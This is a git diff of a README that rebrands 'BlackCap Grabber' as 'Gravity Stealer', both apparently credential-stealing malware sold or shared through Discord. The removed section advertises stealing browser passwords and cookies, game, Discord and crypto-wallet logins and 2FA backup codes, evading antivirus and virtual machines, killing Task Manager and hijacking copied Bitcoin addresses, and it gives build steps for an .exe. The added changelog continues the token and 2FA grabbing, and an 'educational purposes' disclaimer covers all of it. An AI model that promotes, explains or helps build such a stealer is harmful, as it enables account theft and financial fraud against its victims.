@@ -1,81 +1,35 @@
-# BlackCap Grabber v2.2
-
-![](https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png)
-
-
-
-##### [:gem: Premium](https://discord.gg/blackcap)
-
-
 <h1 align="center">
-  BlackCap Grabber🔰
+Gravity Stealer v1.0
 </h1>
-<h1 align="center">
- DISCORD.GG/BLACKCAP
+
+![](https://cdn.discordapp.com/attachments/1055150299142168588/1056297713018339418/V7tx.gif)
+
+
+#<h1 align="center">
+  Gravity Stealer Work With [BlackCap-Grabber](https://github.com/KSCHdsc/BlackCap-Grabber)
 </h1>
 
 
-<h2 align="center">
-  BlackCap Grabber was made with
-
-Love ❌ code ✅
-
-</h2>
 
 **NOTE:** \
-- BlackCap was made for educational purposes, there for all consequences caused by your actions are **your** responsibility and accountability.
+- Gravity stealer was made for educational purposes, there for all consequences caused by your actions are **your** responsibility and accountability.
 - You got an error? you've find a bug?? join the discord or create an issue!
 
 ---
 
 ## <a id="content"></a>🌐 〢 Content
 
-- [🌌・Discord](https://discord.gg/blackcap)
-- [🎉・Setting up BlackCap](#setup)
+- [🌌・Discord](https://discord.gg/webcenter)
 - [🔰・Features](#features)
 - [📝・Changelog](#changelog)
 - [🕵️‍♂️・Credits](#Forked)
 - [💼・Term](#Term)
 
 
-## <a id="setup"></a> 📁 〢 Setting up BlackCap
-
-1. Install [Python](https://www.python.org/downloads/)
-2. Install all requirements [install.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/install.bat)
-3. Click on start.bat [start.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/start.bat)
-4. Complete the configuration
-5. You have your .exe file enjoy :)
-
-
-
 
 ## <a id="features"></a>🔰 〢 Features
-
-# 💎 = Premium Features Join the discord to buy
-
+![](https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/image.png)
 ```diff
-> Default:
-
-- Steal Steam / Minecraft / Metamask / Exodus / Roblox / NationGlory login
-- Steal Chrome Passwords / Cookies / History
-- Inject Discord / Discord Canary / Lightcord / Ripcord / Xcord
-- Debug Killer (Kill task gestionary)
-- Bypass TokenProtector / BetterDiscord
-- Take a Screenshot
-- Grabb System Informations
-- Bypass Virus Total machines
-- Bypass VM machines
-- Hide Itself in Background
-- Replace the BTC address copying by your (💎)
-- Custom Installer / Setuper (💎)
-- Icon / Name / Description Customizable (💎)
-- Cookies Exploiter Tech (💎)
-- Steal all Chromium Passwords and Cookies for OperaGX/Opera/GoogleChrome/Brave/Chromium/Torch/Edge/Mozilla and others (💎)
-- 0/64 Detect Virus Total (.exe) (💎)
-- Grabb Sensitive Files exodus login / a2f backup codes / tokens / passwords... (can be customizable) (💎)
-
-
-
 > Injection:
 
 - Nitro Auto Buy
@@ -93,52 +47,50 @@ Love ❌ code ✅
 ## <a id="changelog"></a>💭 〢 ChangeLog
 
 ```diff
-v1.9 ⋮ 2022-26-10
-- bug fix to search token
+v2.5 ⋮ 2022-26-05
+- bug fix bypass anti request discord
 - error message fixed
-- build with pyinstaller fixed
+- emote fixed
 
-v2.0 : 2022-30-10
-- enoent zipfile bug fixed
-+ Place .exe in startup
-+ Add Fake Error
+v3.2 : 2022-30-06
+- fix new app path
+- fix fetch billing
++ add languages
++ add new inject path in resources/app
++ detect badge
 
-v2.1: 2022-30-10
-+ New builder
-+ Ping on run
-+ Task Manager killer
+v3.9: 2022-25-07
++ detect if a2f enable
 
-v2.1.1: 2022-31-10
-- Builder correction
-+ Compacting Builder
-+ Add auto compressed build
+v4.3: 2022-09-08
+- correct new a2f code backup grabber
++ detect if nsfw is enable
++ new sexy assets
 
-v2.2: 2022-31-10
-- Token Grabber Correction
-+ Grab all other Browsers
-+ CMD and gestionnary killer
+v4.5: 2022-31-10
+- remove a2f backup codes grabber (patched)
++ detect banner / icon
++ modify embed
 
 
-v2.3: 2022-14-11
-+ Detect New Discord Active Developer Badge
+v6.5: 2022-15-11
+- delete emote fixed
++ link to copy on phone
++ detect New Discord Active Developer Badge
+
+
+V6.5.2: 2022-21-11
++ Fix b is not defined error
 ```
 
 
 ### Authors
-- [KSCHdsc](https://github.com/KSCHdsc)
-- [002Sans](https://github.com/002-sans)
+- [MohxKd](https://github.com/MohxK)
 
-### Contributors (CapingTeam)
-- Xenis
-- Nono1337
-- Irax212
-- Shamroks
 
 ### <a id="Forked"></a>🕵️‍♂️ 〢 Forked From:
-- Hazard Grabber
-- PirateStealer
-- Wasp-stealer
-- Builder by Luna token grabber 
+- Hazard Grabber injection
+- PirateStealer injection
 
 
 ### <a id="Term"></a>💼 〢 Term of usage
@@ -147,6 +99,7 @@ v2.3: 2022-14-11
 - [x] Reselling is forbidden
 - [x] You can use the source code if you keep credits (in embed + in markdown), it has to be open-source
 - [x] We are NOT responsible of anything you do with our software (if its illegal)
+
 
 
 <a href=#top>Back to Top</a></p>
